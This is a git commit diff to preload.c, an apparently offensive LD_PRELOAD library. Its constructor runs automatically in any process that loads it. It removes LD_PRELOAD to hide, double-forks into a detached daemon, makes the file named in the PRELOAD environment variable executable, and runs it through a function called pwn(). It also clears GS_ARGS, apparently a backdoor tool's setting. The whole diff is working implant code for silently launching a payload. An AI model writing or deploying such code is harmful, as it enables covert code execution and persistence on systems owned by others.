7280ad52b3ce372772a3a98d112456e3dc71f29d
Cvar1984 <cvar1984@cvar1984.my.id>
2024-08-13 15:37:03 +0700

    [m] daemon

--- preload.c
+++ preload.c
@@ -9,22 +9,37 @@
 #include <signal.h>
 #include <unistd.h>
 
-
 void pwn(void) {
-	chmod(getenv("PRELOAD"), 00777);
-        system(getenv("PRELOAD"));
+    const char *payload = getenv("PRELOAD");
+	chmod(payload, 0755);
+    system(payload);
 }
 
 void daemonize(void) {
 	signal(SIGHUP, SIG_IGN);
-	if (fork() != 0) {
-		exit(EXIT_SUCCESS);
-	}
-}
+	pid_t pid;
 
+	if ((pid = fork()) < 0) {
+        exit(EXIT_FAILURE);
+    } else if (pid > 0) {
+        exit(EXIT_SUCCESS); // Parent exits
+    }
+	if ((pid = fork()) < 0) {
+        exit(EXIT_FAILURE);
+    } else if (pid > 0) {
+        exit(EXIT_SUCCESS); // Parent exits
+    }
+
+	setsid(); // Creates a new session, sets the process group ID to the session ID, and makes the process the session leader.
+    close(STDIN_FILENO);
+    close(STDOUT_FILENO);
+    close(STDERR_FILENO);
+}
+/** __attribute__ ((__constructor__)) is a GCC extension that specifies that the function preloadme should be executed before the main function starts. In other words, it's a way to run code early in the program's lifecycle.
+ */
 __attribute__ ((__constructor__)) void preloadme(void) {
   unsetenv("LD_PRELOAD");
   daemonize();
   pwn();
+  unsetenv("GS_ARGS");
 }
-
